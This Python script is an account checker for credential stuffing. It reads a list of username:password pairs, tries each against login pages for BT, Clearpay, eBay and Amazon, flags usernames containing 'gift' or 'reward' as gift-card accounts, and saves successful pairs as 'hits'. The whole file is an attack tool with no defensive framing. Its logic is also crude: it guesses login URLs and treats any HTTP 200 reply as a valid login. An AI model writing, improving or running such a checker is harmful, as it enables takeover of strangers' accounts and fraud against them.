import requests
import re

def requests_post(url, data):
    response = requests.post(url, data=data)
    return response

def check_login(username, password, service):
    url = f'https://{service}.com/login'
    payload = {
        'username': username,
        'password': password
    }
    
    response = requests_post(url, data=payload)
    if response.status_code == 200:  # Correcting from '20' to '200' (HTTP status code)
        return True
    else:
        return False

def check_logins_from_file(file_path):
    with open(file_path, 'r') as file:
        logins = [login.strip().split(':') for login in file.readlines()]
        
    hits = []
    with open('hits.txt', 'w') as hits_file:
        with open('logins_checked.txt', 'w') as logins_file:
            for username, password in logins:
                is_valid_bt = check_login(username, password, 'bt')
                if is_valid_bt:
                    hits.append((username, password, 'BTinternet'))
                    logins_file.write(f'{username}:{password}\n')

                is_valid_clearpay = check_login(username, password, 'clearpay')
                if is_valid_clearpay:
                    hits.append((username, password, 'Clearpay'))
                    logins_file.write(f'{username}:{password}\n')

                is_valid_ebay = check_login(username, password, 'ebay')
                if is_valid_ebay:
                    hits.append((username, password, 'eBay'))
                    logins_file.write(f'{username}:{password}\n')

                is_valid_amazon = check_login(username, password, 'amazon')
                if is_valid_amazon:
                    hits.append((username, password, 'Amazon'))
                    logins_file.write(f'{username}:{password}\n')

                is_valid_gift = re.search(r'gift|reward', username, re.IGNORECASE)
                if is_valid_gift:
                    hits.append((username, password, 'Gift/Reward Card'))
                    logins_file.write(f'{username}:{password}\n')

    with open('hits.txt', 'w') as hits_file:
        for hit in hits:
            hits_file.write(f'{hit[0]}:{hit[1]}:{hit[2]}\n')

def main():
    print("Script started!")
    file_path = input('Enter the path to the .txt file containing logins (format: username:password): ')
    
    # Debugging print to check the file path input
    print(f"File path entered: {file_path}")
    
    try:
        check_logins_from_file(file_path)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
